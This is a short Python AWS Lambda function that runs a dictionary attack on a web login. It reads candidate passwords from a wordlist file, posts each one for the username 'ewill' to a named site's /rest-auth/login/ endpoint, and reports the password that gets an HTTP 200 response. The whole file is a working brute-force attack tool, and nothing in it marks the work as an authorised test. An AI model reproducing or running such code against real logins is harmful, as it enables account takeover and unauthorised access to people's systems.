import json
from botocore.vendored import requests

def lambda_handler(event, context):
    site_name = "http://shield-app.tk:8000"
    path = "/rest-auth/login/"
    file = open("./words.txt")
    passwords = file.readlines()
    index = 0
    correctPassword = "DEFAULT"
    for pwd in passwords:
        r = requests.post(site_name + path, data = {"username" : "ewill", "password" : passwords[index]})
        if r.status_code is 200:
            correctPassword = passwords[index]
        index += 1
    return {
        "statusCode": 200,
        "body": json.dumps('Correct password = ' + correctPassword)
    }
